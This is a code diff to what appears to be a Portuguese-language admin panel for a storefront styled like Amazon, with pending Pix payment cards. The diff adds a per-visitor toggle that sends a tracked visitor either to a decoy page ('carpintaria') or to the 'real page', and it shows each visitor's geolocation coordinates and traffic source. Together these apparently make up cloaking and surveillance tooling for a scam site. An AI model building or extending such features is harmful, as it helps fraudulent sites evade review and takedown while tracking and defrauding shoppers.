@@ -699,6 +699,30 @@
       .acesso-live-page .live-access-row-meta strong {
         color: var(--amz-text);
       }
+      .acesso-live-page .live-access-row-actions {
+        margin-top: 10px;
+      }
+      .acesso-live-page .live-access-block-toggle {
+        width: 100%;
+        min-height: 34px;
+        border: 1px solid #f3a847;
+        border-radius: 8px;
+        background: linear-gradient(to bottom, #ffb347, #ffa41c);
+        color: #0f1111;
+        cursor: pointer;
+        font-size: 12px;
+        font-weight: 700;
+        padding: 8px 10px;
+      }
+      .acesso-live-page .live-access-block-toggle.is-active {
+        border-color: #b12704;
+        background: #fff1ed;
+        color: #b12704;
+      }
+      .acesso-live-page .live-access-block-toggle:disabled {
+        cursor: progress;
+        opacity: 0.65;
+      }
       .acesso-live-page .live-access-empty {
         color: var(--amz-muted);
         font-size: 13px;
@@ -2642,6 +2666,20 @@ function buildPendingPixCardHtml(stats = {}) {
               <div><strong>Coordenadas:</strong> ${escapeHtml(row.lat.toFixed(5))}, ${escapeHtml(row.lng.toFixed(5))}</div>
               <div><strong>Precisão:</strong> ${row.accuracy ? `${escapeHtml(String(Math.round(row.accuracy)))} m` : 'não informada'}</div>
               <div><strong>Origem:</strong> ${escapeHtml(row.source || 'browser_geolocation')}</div>
+              <div><strong>Tr&aacute;fego:</strong> ${escapeHtml(row.trafficSource?.label || 'Pesquisa direta')}</div>
+            </div>
+            <div class="live-access-row-actions">
+              <button
+                type="button"
+                class="live-access-block-toggle ${row.blocked ? 'is-active' : ''}"
+                data-session-id="${escapeHtml(row.sessionId || '')}"
+                data-attribution-id="${escapeHtml(row.attributionId || '')}"
+                data-current-page="${escapeHtml(row.currentPage || '')}"
+                data-next-blocked="${row.blocked ? 'false' : 'true'}"
+                onclick="toggleLiveAccessBlock(this)"
+              >
+                ${row.blocked ? 'Liberar pagina real' : 'Enviar para carpintaria'}
+              </button>
             </div>
           </div>
         `).join('');
@@ -2687,6 +2725,7 @@ function buildPendingPixCardHtml(stats = {}) {
               <div><b>Atualizado:</b> ${escapeHtml(formatDate(row.updatedAt))}</div>
               <div><b>Coordenadas:</b> ${escapeHtml(row.lat.toFixed(5))}, ${escapeHtml(row.lng.toFixed(5))}</div>
               <div><b>Precisão:</b> ${row.accuracy ? `${escapeHtml(String(Math.round(row.accuracy)))} m` : 'não informada'}</div>
+              <div><b>Tr&aacute;fego:</b> ${escapeHtml(row.trafficSource?.label || 'Pesquisa direta')}</div>
             </div>
           `;
 
@@ -2711,6 +2750,32 @@ function buildPendingPixCardHtml(stats = {}) {
 
         map.fitBounds(bounds, { padding: 60, maxZoom: 11, duration: 600 });
         liveAccessMapHasAutoFramed = true;
+      }
+
+      async function toggleLiveAccessBlock(button) {
+        if (!button) return;
+
+        const nextBlocked = button.dataset.nextBlocked === 'true';
+        button.disabled = true;
+        button.textContent = nextBlocked ? 'Enviando...' : 'Liberando...';
+
+        try {
+          await apiFetch('/api/analytics/live-access/block', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              sessionId: button.dataset.sessionId || '',
+              attributionId: button.dataset.attributionId || '',
+              currentPage: button.dataset.currentPage || '',
+              blocked: nextBlocked,
+            }),
+          });
+          refreshLiveAccess(true);
+        } catch (error) {
+          alert(error.message || 'Nao foi possivel atualizar esse acesso.');
+          button.disabled = false;
+          button.textContent = nextBlocked ? 'Enviar para carpintaria' : 'Liberar pagina real';
+        }
       }
 
       async function refreshLiveAccess(force = false) {
